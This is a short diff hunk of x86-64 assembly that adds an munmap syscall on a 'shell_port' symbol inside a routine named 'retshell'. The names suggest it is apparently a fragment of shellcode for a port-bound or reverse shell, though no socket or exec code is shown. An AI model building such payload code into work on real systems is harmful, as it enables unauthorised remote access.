@@ -130,6 +130,12 @@ retshell:
     xor     eax, eax
     inc     eax ; write
     syscall
+    lea     rdi, [shell_port]
+    xor     esi, esi
+    add     esi, 16
+    xor     eax, eax
+    add     eax, 0xb ; munmap
+    syscall
     leave
     ret
 
